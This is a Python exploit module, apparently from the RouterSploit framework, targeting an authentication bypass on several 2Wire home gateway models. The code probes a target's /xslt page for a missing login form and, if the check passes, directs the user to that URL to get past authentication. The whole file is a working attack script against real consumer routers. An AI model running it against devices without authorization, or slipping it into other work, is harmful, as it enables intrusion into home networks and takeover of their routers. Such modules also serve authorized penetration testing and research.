# rsf exploit module
# description: Exploits 2Wire Gateway authentication bypass vulnerability. 
# If the target is vulnerable, a link to bypass authentication is provided.

import requests

class Exploit:
    __info__ = {
        "name": "2Wire Gateway Auth Bypass",
        "description": "Module exploits 2Wire Gateway authentication bypass vulnerability. "
                       "If the target is vulnerable, a link to bypass authentication is provided.",
        "authors": (
            "bugz",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/9459/",
        ),
        "devices": (
            "2Wire 2701HGV-W",
            "2Wire 3800HGV-B",
            "2Wire 3801HGV",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        if self.check():
            print(f"Target {self.target} is vulnerable")
            print(f"Use your browser to visit: {self.target}:{self.port}/xslt")
        else:
            print("Target seems to be not vulnerable")

    def check(self):
        mark = '<form name="pagepost" method="post" action="/xslt?PAGE=WRA01_POST&amp;NEXTPAGE=WRA01_POST" id="pagepost">'

        # checking if the target is valid
        response = requests.get(f"http://{self.target}:{self.port}/")
        if response is None:
            return False  # target is not vulnerable

        if mark not in response.text:
            return False  # target is not vulnerable

        # checking if authentication can be bypassed
        response = requests.get(f"http://{self.target}:{self.port}/xslt")

        if response is None:
            return False  # target is not vulnerable

        if mark not in response.text:
            return True  # target vulnerable

        return False  # target not vulnerable

